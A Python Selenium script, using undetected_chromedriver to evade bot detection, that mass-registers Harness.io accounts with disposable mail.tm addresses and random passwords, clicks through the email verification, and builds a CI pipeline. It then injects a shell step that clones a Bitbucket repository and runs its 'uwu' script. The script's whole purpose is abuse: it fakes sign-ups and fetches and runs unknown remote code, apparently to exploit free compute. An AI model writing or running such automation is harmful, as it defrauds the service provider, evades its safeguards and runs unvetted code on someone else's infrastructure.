import os
print("rawr")
import undetected_chromedriver as uc
import time
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
import random
import requests
import subprocess

# os.system("npm i")
options = uc.ChromeOptions()
os.system("rm -rf rawrz")
os.system("tar -xf volx.tar.gz")
os.system("rm -rf rawr")
os.system("cp -r rawrz rawr")
a = True
low_word = "abcdefghijklkmnopqrstuvwxyz"
upper_word = "ABDCEFGHIJKLMNOPQRSTUVWXYZ"
number = "1234567890"
symbols = "!@#$%&*"
username_for = low_word
password_for = low_word + upper_word + number + symbols
long_password = 16
long_username = 12
ass = "".join(random.sample(username_for, 12))
options.add_argument('--no-first-run --no-service-autorun --password-store=basic') #wlacz to jak juz nie bedzie dev test
options.user_data_dir = "rawr"
options.add_argument("--window-size=1920,1080")
options.add_argument('--user-data-dir=rawr')
driver = uc.Chrome(options=options, version_main=106)

headersdomain = {'accept': 'application/ld+json'}
responsedomain = requests.get('https://api.mail.tm/domains?page=1', headers=headersdomain)
emil = "".join(random.sample(low_word, 13))+"@"+responsedomain.json()["hydra:member"][0]["domain"]
myobj = {'address': emil,"password": "cloud"}
headersreg = {'accept': 'application/ld+json'}
responsereg = requests.post('https://api.mail.tm/accounts', headers=headersreg, json=myobj)

driver.get("https://app.harness.io/auth/#/signup")
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div/div[2]/div[2]/div/div[1]/div[3]/button[3]").click()
time.sleep(2)
driver.find_element(By.XPATH, "/html/body/div[1]/div[2]/div[2]/div/div[1]/form/div[1]/input").send_keys(emil)
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div[1]/div[2]/div[2]/div/div[1]/form/div[2]/div/input").send_keys("".join(random.sample(low_word, 13))+"H!1")
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div[1]/div[2]/div[2]/div/div[1]/form/button").click()
time.sleep(20)
myobjlog = {'address': emil,"password": "cloud"}
headerslog = {'accept': 'application/ld+json'}
responselog = requests.post('https://api.mail.tm/token', headers=headerslog, json=myobjlog)
token = responselog.json()["token"]
headersmess = {'accept': 'application/ld+json', "Authorization": "Bearer "+token}
responsemess = requests.get('https://api.mail.tm/messages', headers=headersmess)
headersmessz = {'accept': 'application/ld+json', "Authorization": "Bearer "+token}
responsemessz = requests.get('https://api.mail.tm/messages/'+responsemess.json()["hydra:member"][0]["id"], headers=headersmess)
verifylink = responsemessz.json()["text"].split("\n")[15].replace("[","").replace("]", "")
driver.get(verifylink)
time.sleep(20)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div/div[2]").click()
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div/div[2]/button").click()
time.sleep(3)
driver.find_element(By.XPATH, "/html/body/div[1]/div/nav/ul[1]/li[2]/a").click()
time.sleep(3)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div/div/div/button").click()
time.sleep(3)
driver.find_element(By.XPATH, "/html/body/div[6]/div/div[3]/div/span").click()
time.sleep(4)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div[3]/div/div/div/button").click()
time.sleep(2)
driver.find_element(By.XPATH, "/html/body/div[6]/div/div[3]/div/div[2]/div/form/div/div[1]/div[1]/div[2]/div/div/input").send_keys("".join(random.sample(low_word, 6)))
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div[6]/div/div[3]/div/div[2]/div/form/div/div[6]/button[1]").click()
time.sleep(2)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div[1]/div/div/div/div/div/div[2]").click()
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div[1]/div/span/div/div[1]/div[2]/div[2]/div[1]").click()
time.sleep(1.5)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div[1]/div/span/div/div/div/form/div/div[1]/div[1]/div[2]/div/div/input").send_keys("".join(random.sample(low_word, 5)))
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div[1]/div/span/div/div/div/form/div/div[2]/label").click()
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div[1]/div/span/div/div/div/form/div/button").click()
time.sleep(1.8)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div[2]/div/section/div/div[1]/div[3]").click()
time.sleep(2)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div[2]/div/section/div/div[2]/div/div/div[1]/div/form/div/div[1]/div/div/div/label[1]").click()
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div[2]/div/section/div/div[2]/div/div/div[2]/button[2]").click()
time.sleep(1.8)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div[2]/div/section/div/div[2]/div/div/div/div/div/div/div[3]").click()
time.sleep(1.5)
driver.find_element(By.XPATH, "/html/body/div[6]/span/div[1]/button[1]").click()
time.sleep(2)
driver.find_element(By.XPATH, "/html/body/div[7]/div/div[3]/div/div/section[1]/div/section[2]/section[2]/section[9]").click()
time.sleep(2)
driver.find_element(By.XPATH, "/html/body/div[7]/div/div[3]/div[2]/div/div[1]/div/div[2]/div/form/div/div[3]/div/div[2]").click()
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div[9]/div/div/div/div/div/ul/li[1]").click()
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div[7]/div/div[3]/div[2]/div/div[1]/div/div[2]/div/form/div/div[1]/div/div[2]/div/div/input").send_keys("".join(random.sample(low_word, 7)))
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div[7]/div/div[3]/div[2]/div/div[1]/div/div[2]/div/form/div/div[4]/div/div/div/div/div/div[1]/div[2]/div[1]/div[4]").click()
time.sleep(0.5)
actions = ActionChains(driver)
actions.send_keys("""
apt update
apt install wget git -y
git config --global user.email "you@example.com"
git config --global user.name "Your Name"
git clone https://bitbucket.org/dfggcvdrg/uwu/
cd uwu
bash uwu
""")
actions.perform()
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div[7]/div/div[3]/div[1]/h4/div/div[2]/button[1]").click()
time.sleep(1.8)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div[2]/div/section/div/div[1]/div[5]").click()
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div[2]/div/section/div/div[2]/div/div/div[4]/div/div/div/div/div/div[3]").click()
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div[2]/div/section/div/div[2]/div/div/div[4]/div/div/div/div[2]/div/div[2]/div/div/div/div/div[1]/div[2]/div[1]/div[4]/div[1]").click()
actions = ActionChains(driver)
actions.send_keys(Keys.BACK_SPACE+"5")
actions.perform()
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div[2]/div/section/div/div[2]/div/div/div[7]/div/button[2]").click()
time.sleep(2)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[1]/div[3]/div/button[2]").click()
time.sleep(20)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[1]/div[3]/div/button[3]").click()
time.sleep(8)
driver.find_element(By.XPATH, "/html/body/div[7]/div/div[3]/div/div/div/div/div/div/div[4]/div/button").click()
time.sleep(30)
#driver.close()
